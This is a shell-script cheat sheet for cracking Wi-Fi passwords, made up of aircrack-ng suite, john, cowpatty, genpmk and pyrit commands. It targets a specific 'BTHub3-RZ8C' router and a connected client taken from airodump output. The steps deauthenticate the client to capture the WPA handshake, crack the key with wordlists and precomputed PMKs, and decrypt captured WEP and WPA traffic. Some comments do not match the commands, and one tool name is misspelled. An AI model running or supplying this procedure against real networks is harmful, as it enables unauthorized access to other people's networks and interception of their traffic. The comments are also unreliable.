#!/bin/sh

	BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

00:01:3B:97:D0:02  -69       10       73    0  11  54e. WPA2 CCMP   PSK  BTHub3-RZ8C



	BSSID              STATION            PWR   Rate    Lost    Frames  Probe 

 00:01:3B:97:D0:02  00:21:63:24:C0:F9  -68   54e-48e   155       72  


#--------------------------------------------------------------------------------------#


ifconfig wlan0 up

# put card into monitor mode
airmon-ng start wlan0

# get channel, bssid
airodump-ng mon0

# stop monitor mode and start on channel your attacking
airmon-ng stop mon0

# start monitor mode on channel 11
airmon-ng start wlan0 11


# defauth client on the network to get the 4 way handshake
aireplay-ng -0 30 -a 00:01:3B:97:D0:02 -c 00:21:63:24:C0:F9 mon0

# -0 = deauth attack
# 30 = number of deauth packets
# -a 00:09:5B:FF:4F:B6 = the bssid of the wifi network
# -c 00:22:69:08:70:11 = address of client on the network
# wlan0 = our network interface


# run airodump
airodump-ng -c 11 --bssid 00:01:3B:97:D0:02 -w victim mon0

# -c = channel
# --bssid = bssid of the network we found
# -w = write the file out to victim
# wlan0 = our network interface


# dictionary attack
aircrack-ng victim-01.cap -w /pentest/passwords/wordlists/darkc0de.lst 

# then select the network in the terminal

# john the ripper pipe to aircrack-ng

john --incremental --stdout | aircrack-ng -b 00:01:3B:97:D0:02 -w /pentest/passwords/wordlists/darkc0de.lst victim-01.cap

#-----------------------------------------------#
#	pre calcualte pmk with genpmk
#-----------------------------------------------#

genpmk -f /pentest/passwords/wordlists/darkc0de.lst -d PMK-victim -s "BTHub3-RZ8C"

# -f /pentest/passwords/wordlists/darkc0de.lst = wordlist
# -d PMK-victim = save to file
# -s "BTHub3-RZ8C" = essid of AP

#-----------------------------------------------#

# use cowpatty with the PMK to crack 
cowpatty -d PMK-victim -s "BTHub3-RZ8C" -r victim-01.cap

# -d PMK-victim = PMK file
# -s "BTHub3-RZ8C" = essid of AP
# -r victim-01.cap = packet capture file

#-----------------------------------------------#
#	airolib-ng
#-----------------------------------------------#

# use the pre calcualted PMK with aircrack

airolib-ng PMK-Aircrack --import cowpatty PMK-victim

# PMK-Aircrack = aircrack-ng compatible databse to create
# --import cowpatty PMK-victim = calcualted we created

#-----------------------------------------------#

# use the database with aircrack-ng

aircrack-ng -r PMK-Aircrack victim-01.cap

# -r PMK-Aircrack = pre calcualted PMK database for aircrack
# victim-01.cap = packet capture file


#-----------------------------------------------#
#	Pyrit
#-----------------------------------------------#

pyrit -r victim-01.cap -i PMK-victim attack_cowpatty

# -r victim-01.cap = packet capture file
# -i PMK-victim = pmk


#-----------------------------------------------#
#	decrypting wep and wpa packets
#-----------------------------------------------#


# wep decrypting with airedecap-ng
airedecap-ng -w abcdefabcdefabcdef Wep-cracking-demo-01.cap

# -w abcdefabcdefabcdef = wep key
# Wep-cracking-demo-01.cap = packet capture file


#-----------------------------------------------#

# wpa decrypting with airedecap-ng

airedecap-ng -p abcdefabcdefabcdef Wpa-cracking-demo-01.cap -e "wireless labs"

# -w abcdefabcdefabcdef = wpa key
# Wpa-cracking-demo-01.cap = packet capture file
# -e "wireless labs" = network essid




